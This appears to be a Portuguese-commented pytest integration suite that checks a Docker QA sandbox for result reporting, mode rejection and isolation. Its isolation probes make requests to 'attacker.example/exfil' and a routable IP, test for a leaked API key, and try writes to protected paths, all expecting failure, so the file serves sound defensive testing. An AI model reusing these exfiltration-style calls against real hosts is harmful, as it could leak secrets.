"""Execução por stack no sandbox do QA: sucesso, falha, isolamento e prova de
que a falha de uma execução não contamina a seguinte.

ESCOPO REAL DO SANDBOX (verificado contra a imagem e contra
``shared/qa_sandbox.py``, não presumido): ``executar_isolado`` aceita
exatamente dois perfis — ``pytest`` (unitário/integração Python) e
``playwright`` (E2E). Qualquer outro valor de ``modo`` é rejeitado com
``ValueError`` antes de qualquer contato com o Docker, e a imagem
``ai4es-qa-sandbox`` carrega só Python 3.14 + pytest e Node 20 +
@playwright/test + typescript — não há Jest/Vitest/Mocha, JDK/Maven/Gradle
nem toolchain Go dentro dela. As stacks Node unitário, Java/JUnit e Go/go
test do projeto NÃO passam por este sandbox: são executadas por
``shared/testing/unit_runner.py`` via ``subprocess`` no host. Ver
``test_modo_nao_suportado_e_rejeitado_antes_do_docker``, que trava esse
contrato — se alguém adicionar um perfil novo, o teste falha e obriga a
estender esta suíte.

Opt-in (QA_SANDBOX_INTEGRATION=1) porque exige Docker e a imagem já
construída pelo operador: ``docker build -t ai4es-qa-sandbox:local qa_sandbox/``.
"""
import json
import os

import pytest

from shared.qa_sandbox import executar_isolado

pytestmark = pytest.mark.skipif(os.environ.get("QA_SANDBOX_INTEGRATION") != "1",
                                reason="Requer Docker e imagem ai4es-qa-sandbox:local")

# Domínio reservado para teste (RFC 2606/6761): nunca é um alvo real, então
# tentar alcançá-lo é prova de isolamento de rede, não tráfego indesejado.
ALVO_RESERVADO = "attacker.example"
# `attacker.example` não resolve nem COM rede, então sozinho ele não
# distingue "isolado" de "conectado": a prova discriminante é um IP roteável
# que dispensa DNS. Com network_mode=none a pilha não tem rota e o connect
# falha na hora; sem isolamento, conectaria. Os dois juntos cobrem DNS
# (exfiltração por nome) e rota (exfiltração por IP).
IP_ROTEAVEL = "1.1.1.1"


def _containers_existentes() -> set[str]:
    """Equivalente de `docker ps -a -q` — inclui containers já parados."""
    import docker

    cliente = docker.from_env(timeout=10)
    try:
        return {c.id for c in cliente.containers.list(all=True)}
    finally:
        cliente.close()


@pytest.fixture(autouse=True)
def sem_containers_remanescentes():
    """Nenhuma execução pode deixar container para trás — nem a que falha.

    `executar_isolado` remove o container no `finally` (force=True, v=True),
    inclusive em timeout; este fixture é a prova externa disso.
    """
    antes = _containers_existentes()
    yield
    depois = _containers_existentes()
    assert depois - antes == set(), (
        "containers remanescentes depois da execução: " f"{depois - antes}"
    )


def _suite(tmp_path, nome: str, codigo: str):
    suite = tmp_path / f"suite_{nome}"
    suite.mkdir()
    (suite / nome).write_text(codigo, encoding="utf-8")
    return suite


def _app(tmp_path, nome: str, codigo: str):
    app = tmp_path / f"app_{nome}"
    app.mkdir()
    (app / "main.py").write_text(codigo, encoding="utf-8")
    return app


_APP_SONDA_ISOLAMENTO = f'''
import os
import socket
from pathlib import Path

from fastapi import FastAPI

app = FastAPI()


@app.get("/health")
def health():
    return {{"ok": True}}


@app.get("/isolamento")
def isolamento():
    try:
        socket.getaddrinfo({ALVO_RESERVADO!r}, 80)
        rede = "resolveu-dns"
    except OSError:
        rede = "bloqueada"
    if rede == "bloqueada":
        try:
            socket.create_connection(({IP_ROTEAVEL!r}, 443), timeout=2)
            rede = "alcancou-ip"
        except OSError:
            rede = "bloqueada"
    try:
        Path("/input/app/escrita.txt").write_text("x")
        entrada = "escreveu"
    except OSError:
        entrada = "somente-leitura"
    try:
        Path("/etc/qa-sonda").write_text("x")
        raiz = "escreveu"
    except OSError:
        raiz = "somente-leitura"
    return {{
        "rede": rede,
        "entrada": entrada,
        "raiz": raiz,
        "segredo_do_host": "GOOGLE_API_KEY" in os.environ,
        "root": os.getuid() == 0,
    }}
'''


# ---------------------------------------------------------------------------
# Stack 1 — Python/pytest
# ---------------------------------------------------------------------------


def test_pytest_sucesso(tmp_path):
    suite = _suite(tmp_path, "test_ok.py",
                   "def test_soma():\n    assert 1 + 1 == 2\n")
    resultado = executar_isolado(suite, "test_ok.py")
    assert resultado["exit_code"] == 0
    assert resultado["passed"] == 1
    assert resultado["failed"] == 0
    assert resultado["errors"] == []


def test_pytest_falha_de_assercao(tmp_path):
    suite = _suite(tmp_path, "test_falha.py",
                   "def test_soma():\n    assert 1 + 1 == 3\n")
    resultado = executar_isolado(suite, "test_falha.py")
    assert resultado["exit_code"] == 1
    assert resultado["passed"] == 0
    assert resultado["failed"] == 1
    assert resultado["errors"]


def test_pytest_excecao_nao_tratada(tmp_path):
    suite = _suite(tmp_path, "test_excecao.py",
                   "def test_estoura():\n    raise RuntimeError('boom')\n")
    resultado = executar_isolado(suite, "test_excecao.py")
    assert resultado["exit_code"] == 1
    assert resultado["failed"] == 1
    assert any(erro["type"] == "RuntimeError" for erro in resultado["errors"])


def test_pytest_teste_malformado_nao_derruba_a_fronteira(tmp_path):
    """Erro de coleta (SyntaxError) ainda volta estruturado, sem vazar texto."""
    suite = _suite(tmp_path, "test_malformado.py", "def test_x(:\n    pass\n")
    resultado = executar_isolado(suite, "test_malformado.py")
    assert resultado["exit_code"] == 1
    assert resultado["passed"] == 0
    assert set(resultado) >= {"passed", "failed", "skipped", "exit_code", "errors"}


def test_pytest_isolamento_de_rede_fs_e_segredos(tmp_path, monkeypatch):
    monkeypatch.setenv("GOOGLE_API_KEY", "chave-do-host")
    codigo = f'''
import os
import socket
from pathlib import Path

import pytest


def test_rede_bloqueada():
    # DNS (exfiltração por nome) e rota (exfiltração por IP, sem DNS).
    with pytest.raises(OSError):
        socket.getaddrinfo({ALVO_RESERVADO!r}, 80)
    with pytest.raises(OSError):
        socket.create_connection(({ALVO_RESERVADO!r}, 80), timeout=1)
    with pytest.raises(OSError):
        socket.create_connection(({IP_ROTEAVEL!r}, 443), timeout=2)


def test_entrada_somente_leitura():
    with pytest.raises(OSError):
        Path("/input/suite/novo.py").write_text("x")
    with pytest.raises(OSError):
        Path("/etc/qa-sonda").write_text("x")


def test_sem_segredo_do_host_nem_root():
    assert "GOOGLE_API_KEY" not in os.environ
    assert os.getuid() != 0
    assert not Path("/var/run/docker.sock").exists()
'''
    suite = _suite(tmp_path, "test_isolamento_pytest.py", codigo)
    resultado = executar_isolado(suite, "test_isolamento_pytest.py")
    assert resultado["exit_code"] == 0
    assert resultado["passed"] == 3
    assert resultado["failed"] == 0


# ---------------------------------------------------------------------------
# Stack 2 — Playwright/E2E
# ---------------------------------------------------------------------------


def test_playwright_sucesso(tmp_path):
    app = _app(tmp_path, "ok",
               "from fastapi import FastAPI\napp = FastAPI()\n"
               "@app.get('/health')\ndef health(): return {'ok': True}\n")
    suite = _suite(tmp_path, "test.spec.ts",
                   "import { test, expect } from '@playwright/test';\n"
                   "test('alvo responde', async ({ request }) => {\n"
                   "  const r = await request.get('http://127.0.0.1:8765/health');\n"
                   "  expect(r.status()).toBe(200);\n"
                   "});\n")
    resultado = executar_isolado(suite, "test.spec.ts", modo="playwright",
                                 projeto=app, entrypoint="main:app", timeout=60)
    assert resultado["exit_code"] == 0
    assert resultado["passed"] == 1
    assert resultado["failed"] == 0


def test_playwright_falha_de_expectativa(tmp_path):
    app = _app(tmp_path, "falha",
               "from fastapi import FastAPI\napp = FastAPI()\n"
               "@app.get('/health')\ndef health(): return {'ok': True}\n")
    suite = _suite(tmp_path, "test.spec.ts",
                   "import { test, expect } from '@playwright/test';\n"
                   "test('expectativa errada', async ({ request }) => {\n"
                   "  const r = await request.get('http://127.0.0.1:8765/health');\n"
                   "  expect(r.status()).toBe(418);\n"
                   "});\n")
    resultado = executar_isolado(suite, "test.spec.ts", modo="playwright",
                                 projeto=app, entrypoint="main:app", timeout=60)
    assert resultado["exit_code"] == 1
    assert resultado["passed"] == 0
    assert resultado["failed"] == 1


def test_playwright_spec_malformado_e_rejeitado(tmp_path):
    app = _app(tmp_path, "malformado",
               "from fastapi import FastAPI\napp = FastAPI()\n")
    suite = _suite(tmp_path, "test.spec.ts",
                   "import { test, expect } from '@playwright/test';\n"
                   "test('sem fechar', async ({ request }) => {\n")
    resultado = executar_isolado(suite, "test.spec.ts", modo="playwright",
                                 projeto=app, entrypoint="main:app", timeout=60)
    assert resultado["exit_code"] == 1
    assert resultado["passed"] == 0


def test_playwright_isolamento_de_rede_fs_e_segredos(tmp_path, monkeypatch):
    """O alvo E2E roda DENTRO do mesmo container; a sonda é no alvo.

    O spec não pode importar `fs`/`net` (validate-spec.cjs bloqueia), então a
    verificação de rede/FS/segredo é feita pela aplicação gerenciada e
    asseverada pelo spec via HTTP no loopback.
    """
    monkeypatch.setenv("GOOGLE_API_KEY", "chave-do-host")
    app = _app(tmp_path, "sonda", _APP_SONDA_ISOLAMENTO)
    suite = _suite(tmp_path, "test.spec.ts",
                   "import { test, expect } from '@playwright/test';\n"
                   "test('isolamento do alvo', async ({ request }) => {\n"
                   "  const r = await request.get('http://127.0.0.1:8765/isolamento');\n"
                   "  expect(r.status()).toBe(200);\n"
                   "  const corpo = await r.json();\n"
                   "  expect(corpo.rede).toBe('bloqueada');\n"
                   "  expect(corpo.entrada).toBe('somente-leitura');\n"
                   "  expect(corpo.raiz).toBe('somente-leitura');\n"
                   "  expect(corpo.segredo_do_host).toBe(false);\n"
                   "  expect(corpo.root).toBe(false);\n"
                   "});\n")
    resultado = executar_isolado(suite, "test.spec.ts", modo="playwright",
                                 projeto=app, entrypoint="main:app", timeout=90)
    assert resultado["exit_code"] == 0
    assert resultado["passed"] == 1
    assert resultado["failed"] == 0


def test_playwright_nao_alcanca_host_externo(tmp_path):
    """O spec tenta o domínio reservado: a requisição tem de falhar.

    Prova complementar à sonda do alvo — aqui quem tenta sair é o próprio
    runner do Playwright, não a aplicação.
    """
    app = _app(tmp_path, "externo",
               "from fastapi import FastAPI\napp = FastAPI()\n"
               "@app.get('/health')\ndef health(): return {'ok': True}\n")
    suite = _suite(tmp_path, "test.spec.ts",
                   "import { test, expect } from '@playwright/test';\n"
                   f"test('rede externa bloqueada', async ({{ request }}) => {{\n"
                   f"  await expect(request.get('http://{ALVO_RESERVADO}/exfil'))\n"
                   f"    .rejects.toThrow();\n"
                   f"  await expect(request.get('https://{IP_ROTEAVEL}/exfil'))\n"
                   f"    .rejects.toThrow();\n"
                   f"}});\n")
    resultado = executar_isolado(suite, "test.spec.ts", modo="playwright",
                                 projeto=app, entrypoint="main:app", timeout=60)
    assert resultado["exit_code"] == 0
    assert resultado["passed"] == 1


# ---------------------------------------------------------------------------
# Contrato de perfis: o sandbox tem DOIS, não cinco
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("modo", ["jest", "vitest", "mocha", "node", "node:test",
                                 "junit", "java", "go", "gotest", "", "PYTEST"])
def test_modo_nao_suportado_e_rejeitado_antes_do_docker(tmp_path, modo):
    """Trava o contrato real de `executar_isolado`: só pytest e playwright.

    As stacks Node unitário, Java/JUnit e Go/go test rodam fora deste
    sandbox (shared/testing/unit_runner.py, via subprocess no host). Se um
    perfil novo passar a ser aceito aqui, este teste falha — e a suíte acima
    precisa ganhar os casos de sucesso/falha/isolamento dele.
    """
    suite = _suite(tmp_path, "test_ok.py", "def test_x():\n    assert True\n")
    with pytest.raises(ValueError):
        executar_isolado(suite, "test_ok.py", modo=modo)


# ---------------------------------------------------------------------------
# Não-contaminação entre execuções sequenciais
# ---------------------------------------------------------------------------


def test_falha_de_uma_stack_nao_contamina_a_proxima(tmp_path):
    """Sequência alternando falha → sucesso, nas duas stacks do sandbox.

    Cada passo roda em container próprio e descartável; a asserção é que o
    resultado de cada passo reflete só o seu próprio teste (contadores e
    `errors`), que nenhum container sobra (fixture `sem_containers_remanescentes`)
    e que o relatório agregado não tem erro cruzado.
    """
    app = _app(tmp_path, "sequencia",
               "from fastapi import FastAPI\napp = FastAPI()\n"
               "@app.get('/health')\ndef health(): return {'ok': True}\n")

    passos = [
        # (rótulo, kwargs de executar_isolado, exit_code esperado)
        ("pytest-falha-proposital",
         dict(suite=_suite(tmp_path, "test_boom.py",
                           "def test_boom():\n"
                           "    raise RuntimeError('falha proposital')\n"),
              teste="test_boom.py"),
         1),
        ("pytest-sucesso",
         dict(suite=_suite(tmp_path, "test_depois.py",
                           "def test_depois():\n    assert True\n"),
              teste="test_depois.py"),
         0),
        ("playwright-malformado",
         dict(suite=_suite(tmp_path, "quebrado.spec.ts",
                           "import { test } from '@playwright/test';\n"
                           "test('sem fechar', async ({ page }) => {\n"),
              teste="quebrado.spec.ts", modo="playwright",
              projeto=app, entrypoint="main:app", timeout=60),
         1),
        ("playwright-sucesso",
         dict(suite=_suite(tmp_path, "bom.spec.ts",
                           "import { test, expect } from '@playwright/test';\n"
                           "test('alvo responde', async ({ request }) => {\n"
                           "  const r = await request.get("
                           "'http://127.0.0.1:8765/health');\n"
                           "  expect(r.status()).toBe(200);\n"
                           "});\n"),
              teste="bom.spec.ts", modo="playwright",
              projeto=app, entrypoint="main:app", timeout=60),
         0),
        ("pytest-sucesso-depois-do-e2e",
         dict(suite=_suite(tmp_path, "test_final.py",
                           "def test_final():\n    assert 2 + 2 == 4\n"),
              teste="test_final.py"),
         0),
    ]

    agregado: dict[str, dict] = {}
    for rotulo, kwargs, exit_esperado in passos:
        suite = kwargs.pop("suite")
        resultado = executar_isolado(suite, **kwargs)
        agregado[rotulo] = resultado
        assert resultado["exit_code"] == exit_esperado, rotulo

    # Cada passo de sucesso tem contadores próprios e nenhum erro herdado do
    # passo anterior, que falhou.
    for rotulo in ("pytest-sucesso", "playwright-sucesso",
                   "pytest-sucesso-depois-do-e2e"):
        assert agregado[rotulo]["passed"] == 1, rotulo
        assert agregado[rotulo]["failed"] == 0, rotulo
        assert agregado[rotulo]["errors"] == [], rotulo

    assert agregado["pytest-falha-proposital"]["failed"] == 1
    assert agregado["pytest-falha-proposital"]["passed"] == 0
    assert agregado["playwright-malformado"]["passed"] == 0

    # O relatório agregado é serializável e não carrega texto livre do
    # processo (a fronteira só publica contadores e tipos de erro conhecidos).
    serializado = json.dumps(agregado)
    assert "falha proposital" not in serializado
    assert "RuntimeError" in serializado  # tipo do erro do passo 1, só o tipo
